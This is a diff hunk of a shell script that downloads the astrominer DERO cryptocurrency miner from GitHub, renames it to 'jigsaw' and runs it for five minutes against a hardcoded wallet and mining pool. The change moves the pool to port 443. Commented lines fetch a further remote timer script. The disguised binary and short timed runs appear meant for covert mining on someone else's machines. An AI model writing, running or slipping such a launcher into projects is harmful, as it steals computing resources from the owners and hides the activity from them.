@@ -11,7 +11,7 @@
 wget -qO adul.tar.gz https://github.com/tj8519/astrominer/releases/download/V1.4/astrominer-V1.4_amd64_rev1.tar.gz
 tar xf adul.tar.gz
 mv astrominer jigsaw
-timeout 300 ./jigsaw -w dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -r 134.209.221.102:8080 -p stratum
+timeout 300 ./jigsaw -w dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -r 148.113.142.107:443 -p stratum
 #wget -qO timer https://raw.githubusercontent.com/amit12986/SC/main/timer.sh
 #chmod 700 timer
 #timeout 320 ./timer || echo "Udah, Cape pengen beli tape
